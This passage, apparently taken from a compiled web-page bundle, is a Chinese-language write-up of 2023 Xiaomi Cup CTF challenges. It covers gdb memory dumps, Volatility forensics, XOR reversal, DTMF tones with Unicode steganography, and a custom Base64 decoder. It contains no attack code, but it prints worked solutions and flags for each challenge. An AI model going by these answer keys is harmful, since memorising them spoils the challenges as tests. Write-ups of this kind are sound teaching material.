",(0,i.jsx)(n.a,{href:"https://www.53lu.com/tool/jjencode/",target:"_blank",rel:"noopener noreferrer",children:"https://www.53lu.com/tool/jjencode/"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"jjencode\u89E3\u7801",src:I})}),"\n",(0,i.jsx)(n.p,{children:"\u539F\u6765\u662F\u5199\u5728\u4E86localstorage\u91CC\u9762\u4E86\u3002\u3002\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"misc-3-\u654F\u611F\u6570\u636E",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-3-\u654F\u611F\u6570\u636E",children:"#"}),"misc-3 \u654F\u611F\u6570\u636E"]}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u9898\u7ED9\u4E86hint\uFF0C\u5728\u7A0B\u5E8F\u9000\u51FA\u7684\u65F6\u5019\u4E0B\u65AD\u70B9\uFF0C\u7136\u540E\u67E5\u627E\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u76EE\u6807\u5F88\u660E\u786E\uFF0C\u4F46\u662F\u8C03\u8BD5\u5DE5\u5177\u57FA\u672C\u6CA1\u7528\u8FC7\uFF0C\u7136\u540E\u5C31\u5F00\u59CB\u75AF\u72C2\u7684\u8C37\u6B4C\u4E4B\u65C5\uFF0C\u75AF\u72C2\u7684\u8E29\u5751\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5751\u4E00\uFF0C\u7A0B\u5E8F\u5728ubuntu\u73AF\u5883\u4E0B\u8FD0\u884C\u4E0D\u8D77\u6765\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"$ ./mm\n-bash: ./mm: \u6CA1\u6709\u90A3\u4E2A\u6587\u4EF6\u6216\u76EE\u5F55\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u56E0\u4E3A\u8FD9\u662F\u4E2A32\u4F4D\u7684ELF\uFF0C\u800C\u7CFB\u7EDF\u662F64\u4F4D\u7684\uFF0C\u9700\u8981\u5B89\u88C532\u4F4D\u7684\u5E93\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"sudo apt install ia32-libs \u6216 sudo apt install lib32bz2\nsudo apt install gcc-multilib\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5751\u4E8C\uFF0C\u4F7F\u7528gdb\u5982\u4F55\u8BBE\u7F6E\u9000\u51FA\u65AD\u70B9"}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E2A\u95EE\u9898\u5012\u662F\u6CA1\u6709\u56F0\u6270\u592A\u4E45\uFF0C\u5F88\u5FEB\u627E\u5230\u4E86\u7B54\u6848\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"$ gdb ./mm\n(gdb) catch syscall exit exit_group\n(gdb) run\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7A0B\u5E8F\u6267\u884C\u8D77\u6765\uFF0C\u6839\u636E\u63D0\u793A\u8F93\u5165exit\u4F1A\u81EA\u52A8\u65AD\u4F4F\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5751\u4E09\uFF0C\u5982\u4F55\u628A\u67E5\u770B\u5185\u5B58"}),"\n",(0,i.jsx)(n.p,{children:"\u8FD9\u4E00\u6B65\u5361\u4E86\u6709\u4E00\u5468\u4E4B\u4E45\u3002\u521A\u5F00\u59CB\u67E5\u627E\u7684\u65B9\u6CD5\u90FD\u662F\u901A\u8FC7/x\u6307\u4EE4\u67E5\u770B\u67D0\u6BB5\u5185\u5B58\u533A\u57DF\u3002\u7136\u540E\u60F3\u5230\u4E86\u7528IDA pro\u8FDC\u7A0B\u8C03\u8BD5\u770B\u5185\u5B58\uFF0C\u53D1\u73B0\u7A0B\u5E8F\u9000\u51FA\u65F6\u65AD\u4E0D\u4F4F\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7D22\u6027\u95EE\u4E00\u95EEchatGPT\uFF0C\u56DE\u7B54\u7684\u8FD8\u5F88\u9760\u8C31\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"Q: \u5728\u4F7F\u7528gdb\u8C03\u8BD5\u7A0B\u5E8F\u5C06\u7A0B\u5E8F\u4E2D\u65AD\u4E4B\u540E\uFF0C\u5982\u4F55\u5C06\u5F53\u524D\u7A0B\u5E8F\u7684\u5185\u5B58\u5BFC\u51FA\u5E76\u8FDB\u884C\u67E5\u770B\uFF1F\nA: \u5728\u4F7F\u7528gdb\u8C03\u8BD5\u7A0B\u5E8F\u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528gcore\u547D\u4EE4\u5C06\u5F53\u524D\u7A0B\u5E8F\u7684\u5185\u5B58\u5BFC\u51FA\u4E3A\u4E00\u4E2Acore\u6587\u4EF6\uFF0C\u7136\u540E\u4F7F\u7528objdump\u6216\u8005\u5176\u4ED6\u53CD\u6C47\u7F16\u5DE5\u5177\u67E5\u770B\u8BE5\u6587\u4EF6\u3002\n\n\u5177\u4F53\u6B65\u9AA4\u5982\u4E0B\uFF1A\n\n1. \u5728gdb\u4E2D\u4F7F\u7528break\u547D\u4EE4\u8BBE\u7F6E\u65AD\u70B9\uFF0C\u4F7F\u7A0B\u5E8F\u505C\u6B62\u5728\u9700\u8981\u67E5\u770B\u5185\u5B58\u7684\u4F4D\u7F6E\u3002\n\n2. \u4F7F\u7528gcore\u547D\u4EE4\u5BFC\u51FA\u5F53\u524D\u7A0B\u5E8F\u7684\u5185\u5B58\u4E3A\u4E00\u4E2Acore\u6587\u4EF6\uFF0C\u547D\u4EE4\u683C\u5F0F\u4E3A\uFF1A\n\n\ngcore <filename>\n\n   \u5176\u4E2D\uFF0C<filename>\u4E3A\u5BFC\u51FA\u7684core\u6587\u4EF6\u540D\u3002\n\n3. \u4F7F\u7528objdump\u6216\u5176\u4ED6\u53CD\u6C47\u7F16\u5DE5\u5177\u67E5\u770B\u8BE5\u6587\u4EF6\uFF0C\u547D\u4EE4\u683C\u5F0F\u4E3A\uFF1A\n\nobjdump -D <filename>\n\n   \u5176\u4E2D\uFF0C<filename>\u4E3A\u5BFC\u51FA\u7684core\u6587\u4EF6\u540D\u3002\n\n   \u8BE5\u547D\u4EE4\u5C06\u4F1A\u8F93\u51FAcore\u6587\u4EF6\u4E2D\u7684\u6C47\u7F16\u4EE3\u7801\uFF0C\u53EF\u4EE5\u901A\u8FC7\u67E5\u770B\u6C47\u7F16\u4EE3\u7801\u6765\u4E86\u89E3\u7A0B\u5E8F\u5728\u4E2D\u65AD\u65F6\u7684\u72B6\u6001\u548C\u5185\u5B58\u60C5\u51B5\u3002\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8BD5\u4E86\u4E00\u4E0B\uFF0C\u5C45\u7136\u53EF\u4EE5\u3002\u3002\u3002\u5269\u4E0B\u7684\u5C31\u7B80\u5355\u4E86\uFF0Cstrings\u67E5\u627E\u5173\u952E\u5B57flag\u3002\u6210\u529F\u83B7\u53D6flag\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'(gdb) gcore mm_exec_mem_dump\n(gdb) exit\n$ strings mm_exec_mem_dump | grep flag\nposix_spawnattr_setflags\nfchflags\nposix_spawnattr_getflags\n__rseq_flags\nNflag{111-222-333-222}\n    <flags id="i386_eflags" size="4">\n    </flags>\n    <reg name="eflags" bitsize="32" type="i386_eflags" regnum="9"/>\n    <flags id="i386_mxcsr" size="4">\n    </flags>\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"misc-4-ez-forensics",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-4-ez-forensics",children:"#"}),"misc-4 ez forensics"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5185\u5B58\u53D6\u8BC1\uFF0C\u7528\u7684\u662F ",(0,i.jsx)(n.a,{href:"https://www.volatilityfoundation.org/releases",target:"_blank",rel:"noopener noreferrer",children:"https://www.volatilityfoundation.org/releases"})," \uFF0CVolatility 2.6"]}),"\n",(0,i.jsxs)(n.p,{children:["\u627E\u5230\u4E86\u4E00\u7BC7\u5DEE\u4E0D\u591A\u7684\u9898\u89E3\uFF0C\u53C2\u8003\u4E86\u4E00\u4E0B\uFF08\u5173\u952E\u8BCD\u5C45\u7136\u662FdumpIt.exe\uFF0C\u867D\u7136\u5BF9\u89E3\u9898\u6CA1\u7528\uFF0C\u4F46\u662F\u53EF\u4EE5\u7528\u6765\u627E\u9898\u89E3\uFF09",(0,i.jsx)(n.a,{href:"https://n1ght-w0lf.github.io/ctf%20writeups/memlabs-lab1/",target:"_blank",rel:"noopener noreferrer",children:"https://n1ght-w0lf.github.io/ctf%20writeups/memlabs-lab1/"})]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\u5206\u6790dump\u6587\u4EF6\u7684\u57FA\u672C\u4FE1\u606F ",(0,i.jsx)(n.code,{children:"./volatility_2.6_mac64_standalone -f ../mem.raw imageinfo"}),"\n",(0,i.jsx)(n.img,{alt:"dump\u6587\u4EF6\u57FA\u672C\u4FE1\u606F",src:_}),"\n\u53EF\u4EE5\u770B\u5230\u662F\u4E00\u4E2AWin7\u7684\u5185\u5B58dump\u3002\u540E\u9762\u7684\u547D\u4EE4\u91CC\u9700\u8981\u9644\u5E26\u8FD9\u4E2A\u503C\u3002"]}),"\n",(0,i.jsxs)(n.li,{children:["\u67E5\u770B\u5F53\u524D\u7684\u8FDB\u7A0B\u4FE1\u606F\u3002 ",(0,i.jsx)(n.code,{children:"./volatility_2.6_mac64_standalone -f ../mem.raw --profile=Win7SP1x64 psscan"})," \u3002\u80FD\u770B\u5230\u4E24\u4E2A\u6BD4\u8F83\u53EF\u7591\u7684\u8FDB\u7A0Bmspaint.exe\u662F\u753B\u677F\u7A0B\u5E8F\uFF0CDumpIt.exe\u4E0D\u77E5\u9053\u662F\u5565\u3002\uFF08\u540E\u6765\u7528volatility\u7684consoles\u547D\u4EE4\u770B\u4E86\u4E00\u4E0B\u5F53\u65F6\u7684\u547D\u4EE4\u884C\u8F93\u51FA\uFF0CDumpIt.exe\u662F\u4E00\u4E2A\u5C06\u5F53\u524D\u7CFB\u7EDF\u5185\u5B58dump\u4E0B\u6765\u7684\u7A0B\u5E8F\u3002\u3002\u3002\uFF09\n",(0,i.jsx)(n.img,{alt:"\u8FDB\u7A0B\u4FE1\u606F",src:D})]}),"\n",(0,i.jsxs)(n.li,{children:["\u5C06mspaint.exe\u7684\u5185\u5B58\u6570\u636E\u5BFC\u51FA\u6765\u3002",(0,i.jsx)(n.code,{children:"./volatility_2.6_mac64_standalone -f ../mem.raw --profile=Win7SP1x64 memdump -D ../dump_it_2 -p 940"})," \u3002\u5C06\u5BFC\u51FA\u7684940.dmp\u6587\u4EF6\u547D\u540D\u4E3A940.data\u6587\u4EF6\u5907\u7528\u3002"]}),"\n",(0,i.jsxs)(n.li,{children:["\u62FF\u51FA\u753B\u56FE\u5DE5\u5177GIMP ",(0,i.jsx)(n.a,{href:"https://www.gimp.org/downloads/",target:"_blank",rel:"noopener noreferrer",children:"https://www.gimp.org/downloads/"})," \uFF0C\u5C06940.data\u62D6\u8FDB\u53BB\uFF0C\u5F00\u59CB\u8C03\u6574\u5BBD\u5EA6\u3002\n",(0,i.jsx)(n.img,{alt:"GIMP\u67E5\u770B",src:z}),"\n\u5927\u6982\u8C03\u6574\u6210\u8FD9\u4E2A\u5BBD\u5EA6\uFF0C\u628A\u5934\u6B6A\u4E00\u4E0B\uFF0C\u5C31\u80FD\u770B\u6E05flag\u4E86\u3002"]}),"\n"]}),"\n",(0,i.jsxs)(n.h3,{id:"misc-5-chatgpt",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-5-chatgpt",children:"#"}),"misc-5 ChatGPT"]}),"\n",(0,i.jsx)(n.p,{children:"\u771F\u7684\u5168\u7A0B\u53EF\u4EE5\u8BE2\u95EEChatGPT\u8FD9\u4E2A\u9898\u76EE\u600E\u4E48\u89E3\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u7B2C\u4E00\u6B65\u7ED9\u51FA\u4E00\u4E2A\u6587\u4EF6\uFF0C\u901A\u8FC7\u8BE2\u95EE\u5F97\u77E5\u662F\u4E00\u4E2APython\u5B57\u8282\u7801\u7684\u8868\u793A"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"Python\u5B57\u8282\u7801",src:B})}),"\n",(0,i.jsx)(n.p,{children:"\u8BA9chatgpt\u5E2E\u5FD9\u8F6C\u6210\u4EE3\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",meta:"",children:"import random\n\nr = random.Random(1145141919)\npt = input('Enter your flag: ').encode()\nct = b'h\\xfe<\\x88G`\\x8b\\xe2\\xdd$hVL\\xdb\\x1b\\xc8b!~W\\xce'\nbuf = []\n\nfor b in pt:\n    buf.append(r.randint(0, 255) ^ b)\n\nassert bytes(buf) == ct\nprint('Correct!')\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7136\u540E\u8BE2\u95EEgpt\u5982\u4F55\u5F97\u5230correct"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"\u6BB5\u4EE3\u7801\u662F\u4E00\u4E2A\u7B80\u5355\u7684\u52A0\u5BC6\u548C\u89E3\u5BC6\u7A0B\u5E8F\uFF0C\u5176\u4E2D `pt` \u662F\u8F93\u5165\u7684\u660E\u6587\uFF0C`ct` \u662F\u52A0\u5BC6\u540E\u7684\u5BC6\u6587\u3002\u7A0B\u5E8F\u4F7F\u7528\u4E86\u4E00\u4E2A\u4F2A\u968F\u673A\u6570\u751F\u6210\u5668 `r` \u6765\u751F\u6210\u968F\u673A\u7684\u5BC6\u94A5\uFF0C\u7136\u540E\u5C06\u660E\u6587\u548C\u5BC6\u94A5\u8FDB\u884C\u5F02\u6216\u8FD0\u7B97\u5F97\u5230\u5BC6\u6587\u3002\u6700\u540E\u7A0B\u5E8F\u68C0\u67E5\u89E3\u5BC6\u540E\u7684\u7ED3\u679C\u662F\u5426\u4E0E\u5BC6\u6587\u76F8\u7B49\uFF0C\u5982\u679C\u76F8\u7B49\u5219\u8F93\u51FA `Correct!`\u3002\n\n\u4E3A\u4E86\u4FDD\u8BC1\u8F93\u51FA `Correct!`\uFF0C\u9700\u8981\u8F93\u5165\u4E0E `ct` \u5BF9\u5E94\u7684\u660E\u6587\u3002\u53EF\u4EE5\u901A\u8FC7\u5C06 `ct` \u548C\u968F\u673A\u6570\u751F\u6210\u5668 `r` \u8FDB\u884C\u9006\u5411\u64CD\u4F5C\u6765\u89E3\u5BC6\u5F97\u5230\u660E\u6587\uFF1A\n\n`python\nimport random\n\nr = random.Random(1145141919)\nct = b'h\\xfe<\\x88G`\\x8b\\xe2\\xdd$hVL\\xdb\\x1b\\xc8b!~W\\xce'\nbuf = []\n\nfor b in ct:\n    buf.append(r.randint(0, 255) ^ b)\n\npt = bytes(buf)\nprint(pt)\n`\n\n\u8FD0\u884C\u4E0A\u8FF0\u4EE3\u7801\u53EF\u4EE5\u5F97\u5230\u660E\u6587\uFF0C\u5C06\u5176\u8F93\u5165\u5230\u539F\u59CB\u7A0B\u5E8F\u4E2D\u5373\u53EF\u8F93\u51FA `Correct!`\u3002\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u624B\u52A8\u6267\u884C\u8FD9\u6BB5python\u4EE3\u7801\uFF0C\u83B7\u5F97\u6700\u7EC8\u7684flag\u3002"}),"\n",(0,i.jsxs)(n.h3,{id:"misc-6-\u5F26\u5916\u4E4B\u97F3",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#misc-6-\u5F26\u5916\u4E4B\u97F3",children:"#"}),"misc-6 \u5F26\u5916\u4E4B\u97F3"]}),"\n",(0,i.jsx)(n.p,{children:"\u5F00\u59CB\u63D0\u4F9B\u4E86\u4E00\u4E2A7z\u6587\u4EF6\uFF0C\u89E3\u538B\u540E\u6709\u4E2Awav\u7684\u97F3\u9891\u3002\u5148\u7528binwalk\u63A2\u67E5\u4E00\u4E0B\uFF1A"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:'# sumy @ SumyDeMBP in ~/Downloads\n$ binwalk \u5F26\u5916\u4E4B\u97F3.wav\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n4183103       0x3FD43F        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 8bit\n5141579       0x4E744B        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit\n11104073      0xA96F49        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit\n13154108      0xC8B73C        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit\n14767811      0xE156C3        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: OFB, keymode: 4bit\n16412867      0xFA70C3        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit\n16819280      0x100A450       mcrypt 2.5 encrypted data, algorithm: "", keysize: 255 bytes, mode: "{",\n17156186      0x105C85A       mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit\n17742077      0x10EB8FD       mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CFB, keymode: 4bit\n18362924      0x118322C       Zip archive data, encrypted at least v2.0 to extract, compressed size: 133, uncompressed size: 490, name: hide.txt\n18363185      0x1183331       End of Zip archive, footer length: 22\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u53D1\u73B0\u6700\u540E\u9690\u85CF\u4E86\u4E00\u4E2Azip\u5305\u7684\u6570\u636E\uFF0C\u628Azip\u5305\u63D0\u53D6\u51FA\u6765\u89E3\u538B\uFF0C\u9700\u8981\u5BC6\u7801\u3002\u3002\u3002\u4E0B\u9762\u7684\u5DE5\u4F5C\u662F\u627E\u538B\u7F29\u5305\u7684\u5BC6\u7801\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u6000\u7740\u5FD0\u5FD1\u4E0D\u5B89\u7684\u5FC3\u60C5\u5F00\u59CB\u542C\u97F3\u9891\uFF08\u597D\u6015\u6709\u523A\u5566\u523A\u5566\u7684\u58F0\u97F3\u3002\u3002\u3002\uFF09\u53D1\u73B0\u91CC\u9762\u6709\u4E00\u6BB5\u62E8\u53F7\u97F3\u3002\u65E0\u5948\u4E94\u97F3\u4E0D\u5168\uFF0C\u53EA\u80FD\u60F3\u65B9\u6CD5\u627E\u627E\u600E\u4E48\u624B\u89E3\u8FD9\u6BB5\u62E8\u53F7\u97F3\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u5B66\u5230\u4E86\u65B0\u59FF\u52BF\uFF0C",(0,i.jsx)(n.strong,{children:"DTMF\u5BF9\u7167\u8868"})]}),"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"\u4F4E\u9891 \\ \u9AD8\u9891(Hz)"}),(0,i.jsx)(n.th,{children:"1209"}),(0,i.jsx)(n.th,{children:"1336"}),(0,i.jsx)(n.th,{children:"1477"}),(0,i.jsx)(n.th,{children:"1633"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:"697"}),(0,i.jsx)(n.td,{children:"1"}),(0,i.jsx)(n.td,{children:"2"}),(0,i.jsx)(n.td,{children:"3"}),(0,i.jsx)(n.td,{children:"A"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:"770"}),(0,i.jsx)(n.td,{children:"4"}),(0,i.jsx)(n.td,{children:"5"}),(0,i.jsx)(n.td,{children:"6"}),(0,i.jsx)(n.td,{children:"B"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:"852"}),(0,i.jsx)(n.td,{children:"7"}),(0,i.jsx)(n.td,{children:"8"}),(0,i.jsx)(n.td,{children:"9"}),(0,i.jsx)(n.td,{children:"C"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:"941"}),(0,i.jsx)(n.td,{children:"*"}),(0,i.jsx)(n.td,{children:"0"}),(0,i.jsx)(n.td,{children:"#"}),(0,i.jsx)(n.td,{children:"D"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:"\u7528\u97F3\u9891\u5206\u6790\u8F6F\u4EF6\u6253\u5F00\uFF0C\u6211\u7528\u7684Audacity"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"audacity",src:M})}),"\n",(0,i.jsxs)(n.p,{children:["\u53F3\u952E\u8C03\u51FA\u9891\u8C31\u56FE\uFF0C\u7136\u540E\u7528\u8089\u773C\u4F7F\u52B2\u7784\u3002\u3002\u3002\u6570\u5B57\u662F ",(0,i.jsx)(n.code,{children:"951637208426840"}),"\u3002\u3002\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u7528\u6765\u89E3\u538Bzip\u521A\u521A\u597D\u3002\u91CC\u9762\u51FA\u6765\u4E2Ahide.txt\u6587\u4EF6\uFF0C\u5185\u5BB9\u662F\uFF1A"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-text",meta:"",children:"\u200C\u200C\u200C\u200D\u202C\u200D\u202C\u200C\u200C\u200C\u200C\u200D\u202C\uFEFF\u200C\u200C\u200C\u200C\u200C\u200D\u202C\u200C\u200D\u200C\u200C\u200C\u200C\u200D\u202C\u200D\uFEFF\u200C\u200C\u200C\u200C\u200D\uFEFF\u202C\uFEFF\u200C\u200C\u200C\u200C\u200D\u202C\u202C\u200C\u200C\u200C\u200C\u200C\u200C\uFEFF\u200C\u200D\u200C\u200C\u200C\u200C\u200D\u202C\u200D\u200C\u200C\u200C\u200C\u200C\u200D\u202C\u200D\u200D\u200C\u200C\u200C\u200C\u200D\u200D\uFEFF\uFEFF\u6B22\u8FCE\u53C2\u52A0\u200C\u200C\u200C\u200C\u200D\u200C\u200C\u200C\u200C\u200C\u200C\u200C\u200D\u202C\uFEFF\u202C\u200C\u200C\u200C\u200C\u200D\u202C\u200D\u200C\u200C\u200C\u200C\u200C\u200D\u200D\uFEFF\uFEFF\u200C\u200C\u200C\u200C\u200D\uFEFF\u200C\uFEFF\u200C\u200C\u200C\u200C\u200D\u202C\u200D\u200D\u200C\u200C\u200C\u200C\u200D\u202C\u200D\u200D\u200C\u200C\u200C\u200C\u200D\u202C\u202C\uFEFF\u200C\u200C\u200C\u200C\u200D\uFEFF\uFEFF\u200D2023\u5C0F\u7C73\u676FCTF\u5927\u8D5B\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u63D0\u4EA4\u5230flag\u5C45\u7136\u4E0D\u5BF9\u3002\u3002\u3002\u6570\u5B57\u63D0\u4EA4\u4E5F\u4E0D\u5BF9\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u89C2\u5BDF\u6587\u4EF6\u540Dhide\uFF0C\u662F\u4E0D\u662F\u8FD8\u6709\u5B57\u7B26\u9690\u85CF\u8D77\u6765\u4E86\u3002\u3002\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u7F16\u8F91\u5668",src:O})}),"\n",(0,i.jsx)(n.p,{children:"\u679C\u7136\uFF0C\u4E00\u822C\u6587\u672C\u7F16\u8F91\u5668\u6253\u5F00\u662F\u4E0D\u5C55\u793A\u8FD9\u4E9B\u5B57\u7B26\u7684\uFF0C\u6240\u4EE5\u624D\u6CA1\u53D1\u73B0\u3002"}),"\n",(0,i.jsxs)(n.p,{children:["\u7528\u8FD9\u4E2A\u7F51\u5740\u89E3\u5BC6 ",(0,i.jsx)(n.a,{href:"https://330k.github.io/misc_tools/unicode_steganography.html",target:"_blank",rel:"noopener noreferrer",children:"https://330k.github.io/misc_tools/unicode_steganography.html"})," \uFF0C\u5C31\u4F1A\u51FA\u73B0\u6700\u7EC8\u7684flag\u4E86\u3002"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"\u89E3\u5BC6\u7ED3\u679C",src:q})}),"\n",(0,i.jsxs)(n.h2,{id:"mobile",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile",children:"#"}),"Mobile"]}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-1-ba5e64",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-1-ba5e64",children:"#"}),"mobile-1 ba5e64"]}),"\n",(0,i.jsx)(n.p,{children:"\u6254\u5230\u53CD\u7F16\u8BD1\u5DE5\u5177\uFF0C\u53D1\u73B0\u662F\u4E2A\u7F16\u7801\u9898\uFF0C\u8FD9\u91CC\u6574\u7406\u4E86\u4E00\u4E0Bencode\u65B9\u6CD5"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'private val legalChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/".toCharArray()\n\n/**\n * \u7B80\u5316\u4E86\u4E00\u4E0B\uFF0C\u53BB\u9664var1\u6DFB\u52A0\u7A7A\u683C\u7684\u5E72\u6270\n * @param str\n * @return\n */\nfun encode(str: ByteArray): String {\n    val len = str.size\n    val result = StringBuilder(str.size * 3 / 2)\n    var i = 0\n\n    // \u539F\u5B57\u7B26\u4E32\u6BCF\u4E09\u4F4D\u8F6C\u6210\u65B0\u5B57\u7B26\u4E32\u7684\u56DB\u4F4D\n    while (i <= len - 3) {\n        val var4 =\n            (str[i].toInt() and 255 shl 16) or (str[i + 1].toInt() and 255 shl 8) or (str[i + 2].toInt() and 255)\n        result.append(legalChars[var4 shr 18 and 63])\n        result.append(legalChars[var4 shr 12 and 63])\n        result.append(legalChars[var4 shr 6 and 63])\n        result.append(legalChars[var4 and 63])\n        i += 3\n    }\n\n    // \u4E0D\u591F\u7684\u6700\u540E\u8865\u7B49\u4E8E=\n    if (i == len - 2) {\n        val var1 = (str[i].toInt() and 255 shl 16) or (str[i + 1].toInt() and 255 shl 8)\n        result.append(legalChars[var1 shr 18 and 63])\n        result.append(legalChars[var1 shr 12 and 63])\n        result.append(legalChars[var1 shr 6 and 63])\n        result.append("=")\n    } else if (i == len - 1) {\n        val var1 = (str[i].toInt() and 255 shl 16)\n        result.append(legalChars[var1 shr 18 and 63])\n        result.append(legalChars[var1 shr 12 and 63])\n        result.append("==")\n    }\n    return result.toString()\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5BF9\u7167encode\u5199\u51FAdecode\u65B9\u6CD5"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:"fun chi(x: Char): Int {\n    return legalChars.indexOf(x)\n}\n\nfun decode(str: String): String {\n    val result = ArrayList<Byte>()\n    var i = 0\n    while (i < str.length) {\n        // \u6700\u540E\u7684\u7B49\u53F7\n        if (str[i + 2] == '=') {\n            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12)\n            result.add((x shr 16 and 255).toByte())\n        } else if (str[i + 3] == '=') {\n            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12) or (chi(str[i + 2]) shl 6)\n            result.add((x shr 16 and 255).toByte())\n            result.add((x shr 8 and 255).toByte())\n        } else {\n            val x = (chi(str[i]) shl 18) or (chi(str[i + 1]) shl 12) or (chi(str[i + 2]) shl 6) or chi(str[i + 3])\n            result.add((x shr 16 and 255).toByte())\n            result.add((x shr 8 and 255).toByte())\n            result.add((x and 255).toByte())\n        }\n        i += 4\n    }\n    return result.toByteArray().decodeToString()\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8C03\u7528decode\uFF0C\u89E3\u5BC6\u5B57\u7B26\u4E32\uFF0C\u62FF\u5230flag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-kotlin",meta:"",children:'package com.sumygg.mictf2023.android_1;\n\npublic class Main {\n\n    public static void main(String[] args) {\n        String target = "DgGXC18XC19cytvLnJq=";\n        String origin = Base64Kt.decode(target);\n        System.out.println(origin);\n        System.out.println(Base64Kt.encode(origin.getBytes()));\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.h3,{id:"mobile-2-xor",children:[(0,i.jsx)(n.a,{className:"header-anchor","aria-hidden":"true",href:"#mobile-2-xor",children:"#"}),"mobile-2 